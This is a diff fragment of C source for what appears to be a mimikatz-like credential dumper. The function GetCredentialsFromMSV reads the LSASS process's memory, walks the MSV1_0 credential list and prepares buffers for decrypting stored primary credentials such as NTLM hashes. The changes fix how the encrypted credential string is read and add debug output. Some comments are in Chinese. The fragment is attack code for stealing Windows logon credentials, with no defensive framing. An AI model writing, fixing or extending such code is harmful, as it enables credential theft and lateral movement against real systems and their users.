@@ -357,25 +357,28 @@ VOID GetCredentialsFromMSV() {
 		// wprintf(L"Username: %ls\n", );
 		// wprintf(L"NTLMHash: %ls\n\n", );
 
+		memset(&listEntry, 0, sizeof(listEntry));
 		ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));
 
 		bool readOk = ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));
 
 		// 读取凭据链表头
 		PKIWI_MSV1_0_CREDENTIALS credPtr = listEntry.Credentials;
+		wprintf(L"Credentials List Address: 0x%p\n", credPtr);
+
 		while (credPtr) {
 			KIWI_MSV1_0_CREDENTIALS credentials;
 			memset(&credentials, 0, sizeof(credentials));
 			ReadFromLsass(credPtr, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));
 
 			if (credentials.PrimaryCredentials) {
+				PKIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredPtr = (PKIWI_MSV1_0_PRIMARY_CREDENTIALS)credentials.PrimaryCredentials;
 				KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCred;
-				memset(&primaryCred, 0, sizeof(primaryCred));
-				ReadFromLsass(credentials.PrimaryCredentials, &primaryCred, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
+				ReadFromLsass(primaryCredPtr, &primaryCred, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
 
 				// 读取加密的凭据缓冲区
-				LSA_UNICODE_STRING credStr;
-				ReadFromLsass((PUCHAR)credentials.PrimaryCredentials + offsetof(KIWI_MSV1_0_PRIMARY_CREDENTIALS, Credentials), &credStr, sizeof(LSA_UNICODE_STRING));
+				LSA_UNICODE_STRING credStr = primaryCred.Credentials;
+			
 				if (credStr.Length && credStr.Buffer) {
 					BYTE encryptedCreds[2048] = { 0 };
 					BYTE decryptedCreds[2048] = { 0 };
